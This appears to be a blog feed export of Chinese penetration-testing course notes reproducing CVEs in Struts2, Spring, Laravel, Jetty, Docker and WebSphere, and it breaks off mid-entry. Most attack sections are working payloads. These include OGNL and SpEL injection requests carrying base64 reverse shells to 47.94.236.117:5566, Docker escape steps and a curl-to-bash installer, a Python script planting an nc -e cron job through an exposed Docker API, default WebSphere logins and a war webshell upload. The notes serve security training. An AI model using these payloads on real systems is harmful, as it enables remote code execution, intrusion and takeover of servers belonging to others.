      <link href="/2023/03/13/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/"/>
      <url>/2023/03/13/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p><img src="/../images/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/image-20230313183111633.png" alt="image-20230313183111633"></p><p>中间件及框架列表：</p><p>IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等</p><p>1、开发框架-PHP-Laravel-Thinkphp</p><p>2、开发框架-Javaweb-St2-Spring</p><p>3、开发框架-Python-django-Flask</p><p>4、开发框架-Javascript-Node.js-JQuery</p><h3 id="常见语言开发框架："><a href="#常见语言开发框架：" class="headerlink" title="常见语言开发框架："></a>常见语言开发框架：</h3><p>PHP：Thinkphp Laravel YII CodeIgniter CakePHP Zend等(前三个比较多)</p><p>JAVA：Spring Springboot MyBatis Hibernate Struts2等(前两个比较多)</p><p>Python：Django Flask Bottle Turbobars Tornado Web2py等(前两个比较多)</p><p>Javascript：Vue.js Node.js Bootstrap JQuery Angular等(前两个比较多)</p><h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>常见中间件的安全测试：</p><p>1、配置不当-解析&amp;弱口令</p><p>2、安全机制-特定安全漏洞</p><p>3、安全机制-弱口令爆破攻击</p><p>4、安全应用-框架特定安全漏洞</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>-中间件安全测试流程：</p><p>1、判断中间件信息-名称&amp;版本&amp;三方</p><p>2、判断中间件问题-配置不当&amp;公开漏洞</p><p>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞</p><h3 id="应用服务安全测试流程：见图"><a href="#应用服务安全测试流程：见图" class="headerlink" title="-应用服务安全测试流程：见图"></a>-应用服务安全测试流程：见图</h3><p>1、判断服务开放情况-端口扫描&amp;组合应用等</p><p>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等</p><p>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p><h3 id="开发框架组件安全测试流程："><a href="#开发框架组件安全测试流程：" class="headerlink" title="-开发框架组件安全测试流程："></a>-开发框架组件安全测试流程：</h3><p>1、判断常见语言开发框架类型</p><p>2、判断开发框架存在的CVE问题</p><p>3、判断开发框架CVE漏洞利用方式</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ PHP-开发框架安全-Thinkphp&amp;Laravel</p><p>➢ JAVAWEB-开发框架安全-Spring&amp;Struts2</p><h4 id="PHP-开发框架安全-Thinkphp-amp-Laravel"><a href="#PHP-开发框架安全-Thinkphp-amp-Laravel" class="headerlink" title="#PHP-开发框架安全-Thinkphp&amp;Laravel"></a>#PHP-开发框架安全-Thinkphp&amp;Laravel</h4><p>-Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web Framework)。</p><blockquote><p>CVE-2021-3129 RCE</p><p>复现：getshell脚本</p><p>Laravel &lt;&#x3D; 8.4.2</p><p><a href="https://github.com/zhzyker/CVE-2021-3129">https://github.com/zhzyker/CVE-2021-3129</a></p><p><a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a></p><p><img src="/../images/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/image-20230313195844005.png" alt="image-20230313195844005"></p></blockquote><p>Thinkphp-3.X RCE-5.X RCE</p><p>ThinkPHP是一套开源的、基于PHP的轻量级Web应用开发框架</p><p>武器库-Thinkphp专检</p><h4 id="JAVAWEB-开发框架安全-Spring-amp-Struts2"><a href="#JAVAWEB-开发框架安全-Spring-amp-Struts2" class="headerlink" title="#JAVAWEB-开发框架安全-Spring&amp;Struts2"></a>#JAVAWEB-开发框架安全-Spring&amp;Struts2</h4><h5 id="Struts2是一个基于MVC设计模式的Web应用框架"><a href="#Struts2是一个基于MVC设计模式的Web应用框架" class="headerlink" title="Struts2是一个基于MVC设计模式的Web应用框架"></a>Struts2是一个基于MVC设计模式的Web应用框架</h5><h6 id="1、2020前漏洞"><a href="#1、2020前漏洞" class="headerlink" title="1、2020前漏洞"></a>1、2020前漏洞</h6><p>武器库-st2专检</p><h6 id="2、cve-2020-17530"><a href="#2、cve-2020-17530" class="headerlink" title="2、cve_2020_17530"></a>2、cve_2020_17530</h6><p>脚本：<a href="https://github.com/YanMu2020/s2-062">https://github.com/YanMu2020/s2-062</a></p><p>手工：</p><p>Content-Type: multipart&#x2F;form-data; boundary&#x3D;—-1</p><p>——1</p><p>Content-Disposition: form-data; name&#x3D;”id”</p><p>%{(#instancemanager&#x3D;#application[“org.apache.tomcat.InstanceManager”]).(#stack&#x3D;#attr[“com.opensymphony.xwork2.util.ValueStack.ValueStack”]).(#bean&#x3D;#instancemanager.newInstance(“org.apache.commons.collections.BeanMap”)).(#bean.setBean(#stack)).(#context&#x3D;#bean.get(“context”)).(#bean.setBean(#context)).(#macc&#x3D;#bean.get(“memberAccess”)).(#bean.setBean(#macc)).(#emptyset&#x3D;#instancemanager.newInstance(“java.util.HashSet”)).(#bean.put(“excludedClasses”,#emptyset)).(#bean.put(“excludedPackageNames”,#emptyset)).(#arglist&#x3D;#instancemanager.newInstance(“java.util.ArrayList”)).(#arglist.add(“id”)).(#execute&#x3D;#instancemanager.newInstance(“freemarker.template.utility.Execute”)).(#execute.exec(#arglist))}</p><p>——1–</p><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ&#x3D;&#x3D;}|{base64,-d}|{bash,-i}</p><p>Content-Type: application&#x2F;x-www-form-urlencoded</p><p>id&#x3D;%25%7b%28%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%3d%23%61%70%70%6c%69%63%61%74%69%6f%6e%5b%22%6f%72%67%2e%61%70%61%63%68%65%2e%74%6f%6d%63%61%74%2e%49%6e%73%74%61%6e%63%65%4d%61%6e%61%67%65%72%22%5d%29%2e%28%23%73%74%61%63%6b%3d%23%61%74%74%72%5b%22%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%75%74%69%6c%2e%56%61%6c%75%65%53%74%61%63%6b%2e%56%61%6c%75%65%53%74%61%63%6b%22%5d%29%2e%28%23%62%65%61%6e%3d%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%22%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%63%6f%6c%6c%65%63%74%69%6f%6e%73%2e%42%65%61%6e%4d%61%70%22%29%29%2e%28%23%62%65%61%6e%2e%73%65%74%42%65%61%6e%28%23%73%74%61%63%6b%29%29%2e%28%23%63%6f%6e%74%65%78%74%3d%23%62%65%61%6e%2e%67%65%74%28%22%63%6f%6e%74%65%78%74%22%29%29%2e%28%23%62%65%61%6e%2e%73%65%74%42%65%61%6e%28%23%63%6f%6e%74%65%78%74%29%29%2e%28%23%6d%61%63%63%3d%23%62%65%61%6e%2e%67%65%74%28%22%6d%65%6d%62%65%72%41%63%63%65%73%73%22%29%29%2e%28%23%62%65%61%6e%2e%73%65%74%42%65%61%6e%28%23%6d%61%63%63%29%29%2e%28%23%65%6d%70%74%79%73%65%74%3d%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%22%6a%61%76%61%2e%75%74%69%6c%2e%48%61%73%68%53%65%74%22%29%29%2e%28%23%62%65%61%6e%2e%70%75%74%28%22%65%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%22%2c%23%65%6d%70%74%79%73%65%74%29%29%2e%28%23%62%65%61%6e%2e%70%75%74%28%22%65%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%22%2c%23%65%6d%70%74%79%73%65%74%29%29%2e%28%23%61%72%67%6c%69%73%74%3d%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%22%6a%61%76%61%2e%75%74%69%6c%2e%41%72%72%61%79%4c%69%73%74%22%29%29%2e%28%23%61%72%67%6c%69%73%74%2e%61%64%64%28%22%77%68%6f%61%6d%69%22%29%29%2e%28%23%65%78%65%63%75%74%65%3d%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%29%29%2e%28%23%65%78%65%63%75%74%65%2e%65%78%65%63%28%23%61%72%67%6c%69%73%74%29%29%7d</p><p>3、cve_2021_31805</p><p><a href="https://github.com/YanMu2020/s2-062">https://github.com/YanMu2020/s2-062</a></p><h5 id="Spring框架是由于软件开发的复杂性而创建的。"><a href="#Spring框架是由于软件开发的复杂性而创建的。" class="headerlink" title="Spring框架是由于软件开发的复杂性而创建的。"></a>Spring框架是由于软件开发的复杂性而创建的。</h5><p>springboot特有的报错页面</p><p><img src="/../images/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/image-20230319173233219.png" alt="image-20230319173233219"></p><h6 id="1、cve-2017-4971-Spring-Web-Flow"><a href="#1、cve-2017-4971-Spring-Web-Flow" class="headerlink" title="1、cve_2017_4971-Spring Web Flow"></a>1、cve_2017_4971-Spring Web Flow</h6><p>Spring WebFlow 2.4.0 - 2.4.4</p><p><a href="https://paper.seebug.org/322/">https://paper.seebug.org/322/</a></p><p>_eventId_confirm&#x3D;&amp;<em>csrf&#x3D;e06e1d86-e083-45f7-b700-567b5f7f5d30&amp;</em>(new+java.lang.ProcessBuilder(“bash”,”-c”,”bash+-i+&gt;%26+&#x2F;dev&#x2F;tcp&#x2F;47.94.236.117&#x2F;5566+0&gt;%261”)).start()&#x3D;vulhub</p><h6 id="2、cve-2018-1273-Spring-Data-Commons"><a href="#2、cve-2018-1273-Spring-Data-Commons" class="headerlink" title="2、cve_2018_1273-Spring Data Commons"></a>2、cve_2018_1273-Spring Data Commons</h6><p>Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)</p><p>Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)</p><p>Spring Data Commons 2.0 to 2.0.5 (Kay SR5)</p><p>Spring Data REST 3.0 - 3.0.5 (Kay SR5)</p><p>编码：bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ&#x3D;&#x3D;}|{base64,-d}|{bash,-i}，不编码直接执行反弹不成功</p><p><img src="/../images/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/image-20230313211552806.png" alt="image-20230313211552806"></p><p>原因是此处接收数据时urlencoded</p><p><img src="/../images/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/image-20230313213148636.png" alt="image-20230313213148636"></p><p>编码后：</p><p>username[#this.getClass().forName(“java.lang.Runtime”).getRuntime().exec(“%62%61%73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%30%4e%79%34%35%4e%43%34%79%4d%7a%59%75%4d%54%45%33%4c%7a%55%31%4e%6a%59%67%4d%44%34%6d%4d%51%3d%3d%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d”)]&#x3D;&amp;password&#x3D;&amp;repeatedPassword&#x3D;</p><p><img src="/../images/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/image-20230313211714594.png" alt="image-20230313211714594"></p><p>虽然返回500，但是shell实际已经反弹成功了</p><p><img src="/../images/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/image-20230313211849477.png" alt="image-20230313211849477"></p><p>小知识点：burp修改了host以后同时需要改右上角的target</p><p><img src="/../images/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/image-20230313210136960.png" alt="image-20230313210136960"></p><h6 id="3、CVE-2022-22963-Spring-Cloud-Function-Spel表达式注入"><a href="#3、CVE-2022-22963-Spring-Cloud-Function-Spel表达式注入" class="headerlink" title="3、CVE-2022-22963 Spring Cloud Function Spel表达式注入"></a>3、CVE-2022-22963 Spring Cloud Function Spel表达式注入</h6><p>Spring Cloud Function 提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像 Amazon AWS Lambda 这样的 FaaS（函数即服务，function as a service）平台。</p><p>Connection: close</p><p>spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(“bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ&#x3D;&#x3D;}|{base64,-d}|{bash,-i}”)</p><p>页面显示：</p><p><img src="/../images/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/image-20230313213400177.png" alt="image-20230313213400177"></p><p>抓取数据包，发送payload，发现不编码能反弹shell，编码后反而不能反弹,原因是请求方式不同</p>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day61 服务攻防-中间件安全&amp;CVE复现&amp;K8s&amp;Docker&amp;Jetty&amp;Websphere</title>
      <link href="/2023/03/12/Day61-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-K8s-Docker-Jetty-Websphere/"/>
      <url>/2023/03/12/Day61-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-K8s-Docker-Jetty-Websphere/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>中间件及框架列表：</p><p>IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等</p><p>0、中间件-K8s安全</p><p>1、中间件-Jetty安全</p><p>2、中间件-Docker安全</p><p>3、中间件-WebSphere安全</p><h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>常见中间件的安全测试：</p><p>1、配置不当-解析&amp;弱口令</p><p>2、安全机制-特定安全漏洞</p><p>3、安全机制-弱口令爆破攻击</p><p>4、安全应用-框架特定安全漏洞</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>中间件安全测试流程：</p><p>1、判断中间件信息-名称&amp;版本&amp;三方</p><p>2、判断中间件问题-配置不当&amp;公开漏洞</p><p>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞</p><h3 id="应用服务安全测试流程：见图"><a href="#应用服务安全测试流程：见图" class="headerlink" title="应用服务安全测试流程：见图"></a>应用服务安全测试流程：见图</h3><p>1、判断服务开放情况-端口扫描&amp;组合应用等</p><p>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等</p><p>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 中间件-K8s-搜哈</p><p>➢ 中间件-Jetty-搜哈</p><p>➢ 中间件-Docker-搜哈</p><p>➢ 中间件-WebSphere-搜哈</p><p>➢ 配合下-Fofa_Viewer-搜哈</p><h4 id="中间件-K8s-搜哈"><a href="#中间件-K8s-搜哈" class="headerlink" title="#中间件-K8s-搜哈"></a>#中间件-K8s-搜哈</h4><p>kubernetes简称 k8s，是一个由google开源的，用于自动部署，扩展和管理容器化应用程序的开源系统。在B站内部，k8s在管理生产级容器和应用服务部署已经有较为广泛和成熟的应用。通过k8s，可跨多台主机进行容器编排、快速按需扩展容器化应用及其资源、对应用实施状况检查、服务发现和负载均衡等。</p><p><a href="https://blog.csdn.net/w1590191166/article/details/122028001">(20条消息) k8s对外攻击面总结_k8s漏洞_ATpiu的博客-CSDN博客</a></p><h4 id="中间件-Jetty-搜哈"><a href="#中间件-Jetty-搜哈" class="headerlink" title="#中间件-Jetty-搜哈"></a>#中间件-Jetty-搜哈</h4><p>Elipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。</p><p>三个都是同一处敏感信息泄露</p><p>CVE-2021-28164</p><p><a href="http://123.58.236.76:63126/WEB-INF/web.xml">http://123.58.236.76:63126/%2e/WEB-INF/web.xml</a></p><p>CVE-2021-28169</p><p><a href="http://123.58.236.76:63126/static?/WEB-INF/web.xml">http://123.58.236.76:63126/static?/WEB-INF/web.xml</a></p><p>CVE-2021-34429</p><p><a href="http://123.58.236.76:63126/%u002e/WEB-INF/web.xml">http://123.58.236.76:63126/%u002e/WEB-INF/web.xml</a></p><h4 id="中间件-Docker-沙盒-搜哈"><a href="#中间件-Docker-沙盒-搜哈" class="headerlink" title="#中间件-Docker(沙盒)-搜哈"></a>#中间件-Docker(沙盒)-搜哈</h4><p>Docker容器是使用沙盒机制，是单独的系统，理论上是很安全的，通过利用某种手段，再结合执行POC或EXP，就可以返回一个宿主机的高权限Shell，并拿到宿主机的root权限，可以直接操作宿主机文件。 它从容器中逃了出来，因此我们形象的称为Docker逃逸漏洞。</p><h6 id="1、容器判断："><a href="#1、容器判断：" class="headerlink" title="1、容器判断："></a>1、容器判断：</h6><p><strong>判断方法一：</strong></p><p>-是否存在.dockerenv文件</p><p>ls -alh &#x2F;.dockerenv</p><p>如果是在root下，则返回</p><p><img src="/../images/Day61-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-K8s-Docker-Jetty-Websphere/image-20230313095248280.png" alt="image-20230313095248280"></p><p>如果是在容器环境下</p><p><img src="/../images/Day61-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-K8s-Docker-Jetty-Websphere/image-20230313095321073.png" alt="image-20230313095321073"></p><p><strong>判断方法二：</strong></p><p>-查询系统进程的cgroup信息：</p><p>cat &#x2F;proc&#x2F;1&#x2F;cgroup</p><p>在root用户下</p><p><img src="/../images/Day61-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-K8s-Docker-Jetty-Websphere/image-20230313095344070.png" alt="image-20230313095344070"></p><p>在容器环境下，有明显的docker字眼</p><p><img src="/../images/Day61-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-K8s-Docker-Jetty-Websphere/image-20230313095604508.png" alt="image-20230313095604508"></p><h6 id="2、容器逃逸漏洞：权限提升"><a href="#2、容器逃逸漏洞：权限提升" class="headerlink" title="2、容器逃逸漏洞：权限提升"></a>2、容器逃逸漏洞：权限提升</h6><p>-由内核漏洞引起 ——Dirty COW(CVE-2016-5195)</p><p>-由 Docker 软件设计引起——CVE-2019-5736、CVE-2019-14271，CVE-2020-15257</p><p>-由配置不当引起——开启privileged（特权模式）+宿主机目录挂载（文件挂载）、功能（capabilities）机制、sock通信方式</p><p>-CVE-2016-5195</p><p>相关复现：</p><p>1、<a href="https://blog.csdn.net/qq_44657899/article/details/120584394">(20条消息) Docker 容器逃逸漏洞(CVE-2020-15257)复现_cve-2020-15270 漏洞复现_天问_Herbert555的博客-CSDN博客</a></p><p>2、[(20条消息) <a href="https://blog.csdn.net/Breeze_CAT/article/details/123427680">漏洞分析] CVE-2022-0492 容器逃逸漏洞分析_breezeO_o的博客-CSDN博客</a></p><p><a href="https://github.com/gebl/dirtycow-docker-vdso">https://github.com/gebl/dirtycow-docker-vdso</a></p><p><a href="https://www.ichunqiu.com/experiment/catalog?id=100295">https://www.ichunqiu.com/experiment/catalog?id=100295</a></p><p># 使用本地1234端口连接docker的1234端口运行dirtycow镜像，并将其临时命名为test</p><p># 其中 test：为临时名称，可以自定义填写。 -p： 第一个端口为本机的端口，第二个端口为Docker的端口。 -itd：意思是在后台运行，交互式运行，并且输出当前的信息 &#x2F;bin&#x2F;bash：调用Shell</p><p>docker run –name&#x3D;test -p 1234:1234 -itd dirtycow &#x2F;bin&#x2F;bash </p><p># 进入镜像内部</p><p>docker exec -it test &#x2F;bin&#x2F;bash</p><p># 编译并运行POC</p><p>cd &#x2F;dirtycow-vdso&#x2F;  </p><p>make      </p><p>.&#x2F;0xdeadbeef   </p><p>-CVE-2019-5736</p><p>复现链接：<a href="https://blog.51cto.com/u_15060465/4336524">docker逃逸漏洞复现（CVE-2019-5736）_51CTO博客_docker 逃逸</a></p><p>复现：curl <a href="https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw">https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw</a> -o install.sh &amp;&amp; bash install.sh</p><p>1、下载POC</p><p>git clone <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p><p>2、修改编译生成payload</p><p>CGO_ENABLED&#x3D;0 GOOS&#x3D;linux GOARCH&#x3D;amd64  go build main.go</p><p>3.将该payload拷贝到docker容器中（此时可以模拟攻击者获取了docker容器权限，在容器中上传payload进行docker逃逸） 并执行</p><p>docker cp main ecca872da49d:&#x2F;home</p><p>docker exec -it ecca872da49d bash</p><p>cd &#x2F;home&#x2F;</p><p>chmod 777 main</p><p>.&#x2F;main</p><p>4、再次进入docker镜像后监听即可收到</p><p>docker exec -it 镜像ID bash</p><p>nc -lvvp</p><p>3、容器安全漏洞</p><p>docker未授权访问漏洞-vulhub-exp.py</p><p>import docker</p><p>client &#x3D; docker.DockerClient(base_url&#x3D;’http:&#x2F;&#x2F;目标IP:2375&#x2F;‘)</p><p>data &#x3D; client.containers.run(‘alpine:latest’, r’’’sh -c “echo ‘* * * * * &#x2F;usr&#x2F;bin&#x2F;nc 反弹IP 端口 -e &#x2F;bin&#x2F;sh’ &gt;&gt; &#x2F;tmp&#x2F;etc&#x2F;crontabs&#x2F;root” ‘’’, remove&#x3D;True, volumes&#x3D;{‘&#x2F;etc’: {‘bind’: ‘&#x2F;tmp&#x2F;etc’, ‘mode’: ‘rw’}})</p><h4 id="中间件-WebSphere-搜哈"><a href="#中间件-WebSphere-搜哈" class="headerlink" title="#中间件-WebSphere-搜哈"></a>#中间件-WebSphere-搜哈</h4><p>WebSphere® Application Server 加速交付新应用程序和服务，它可以通过快速交付创新的应用程序来帮助企业提供丰富的用户体验从基于开放标准的丰 富的编程模型中进行选择，以便更好地协调项目需求与编程模型功能和开发人员技能。</p><p>端口：9080—web(http)应用访问端口、9443—web(https)应用访问端口、9060—管理后台访问端口、9043—管理控制台安全端口、8880—SOAP连接器端口等等。</p><p>漏洞探测在8880端口，后台是9060端口，解析是9080端口</p><p>拉取镜像：docker pull iscrosales&#x2F;websphere7</p><p>启动镜像：docker run -d -p 9060:9060 -p 9043:9043 -p 8880:8880 -p 9080:9080 iscrosales&#x2F;websphere7</p><p>停止镜像：docker stop $(docker ps -aq)</p><h6 id="1、CVE-2015-7450-反序列化"><a href="#1、CVE-2015-7450-反序列化" class="headerlink" title="1、CVE-2015-7450 反序列化"></a>1、CVE-2015-7450 反序列化</h6><p>工具搜哈：<a href="http://47.94.236.117:8880/">http://47.94.236.117:8880/</a></p><h6 id="2、弱口令-上传拿Shell"><a href="#2、弱口令-上传拿Shell" class="headerlink" title="2、弱口令 上传拿Shell"></a>2、弱口令 上传拿Shell</h6><p>-在6.x至7.0版本，后台登陆只需要输入admin作为用户标识，无需密码，即可登陆后台。</p><p>-websphere&#x2F; websphere</p><p>-system&#x2F; manager</p><p>访问：<a href="http://47.94.236.117:9060/">http://47.94.236.117:9060/</a></p><p>登录：admin</p><p>上传：war马</p><p>启动：1_war</p><p>连接：<a href="http://47.94.236.117:9080/1/1.jsp">http://47.94.236.117:9080/1/1.jsp</a></p><h6 id="3、CVE-2020-4450：无利用POC-x2F-EXP"><a href="#3、CVE-2020-4450：无利用POC-x2F-EXP" class="headerlink" title="3、CVE-2020-4450：无利用POC&#x2F;EXP"></a>3、CVE-2020-4450：无利用POC&#x2F;EXP</h6>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day60 服务攻防-中间件安全&amp;CVE复现&amp;Weblogic&amp;Jenkins&amp;GlassFish</title>
      <link href="/2023/03/12/Day60-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Weblogic-Jenkins-GlassFish/"/>
      <url>/2023/03/12/Day60-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Weblogic-Jenkins-GlassFish/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>中间件及框架列表：</p><p>IIS，Apache，Nginx，Tomcat，Docker，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等</p><p>1、中间件-Weblogic安全</p><p>2、中间件-JBoos安全</p><p>2、中间件-Jenkins安全</p><p>3、中间件-GlassFish安全</p><h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>常见中间件的安全测试：</p><p>1、配置不当-解析&amp;弱口令</p><p>2、安全机制-特定安全漏洞</p><p>3、安全机制-弱口令爆破攻击</p><p>4、安全应用-框架特定安全漏洞</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>中间件安全测试流程：</p><p>1、判断中间件信息-名称&amp;版本&amp;三方</p><p>2、判断中间件问题-配置不当&amp;公开漏洞</p><p>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞</p><h3 id="应用服务安全测试流程：见图"><a href="#应用服务安全测试流程：见图" class="headerlink" title="应用服务安全测试流程：见图"></a>应用服务安全测试流程：见图</h3><p>1、判断服务开放情况-端口扫描&amp;组合应用等</p><p>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等</p><p>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 中间件-Weblogic-工具搜哈</p><p>➢ 中间件-JBoos-工具脚本搜哈</p><p>➢ 中间件-Jenkins-工具脚本搜哈</p><p>➢ 中间件-GlassFish-工具脚本搜哈</p><p>➢ 配合下-FofaViewer-工具脚本搜哈</p><h4 id="中间件-Weblogic-工具搜哈"><a href="#中间件-Weblogic-工具搜哈" class="headerlink" 